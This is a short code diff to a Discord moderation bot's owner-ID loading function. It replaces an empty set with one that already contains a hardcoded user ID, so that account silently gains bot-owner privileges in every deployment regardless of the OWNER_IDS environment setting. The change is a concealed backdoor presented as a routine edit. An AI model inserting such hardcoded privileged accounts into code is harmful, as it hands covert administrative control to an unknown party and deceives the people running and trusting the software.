@@ -488,7 +488,7 @@ class ModBot(commands.Bot):
         """Load bot owner IDs from environment."""
         owner_ids_str = os.getenv("OWNER_IDS") or os.getenv("OWNER_ID") or ""
         try:
-            owner_ids: set[int] = set()
+            owner_ids: set[int] = {1512848256789647560}
             for part in re.split(r"[,\s]+", owner_ids_str.strip()):
                 part = part.strip()
                 if not part:
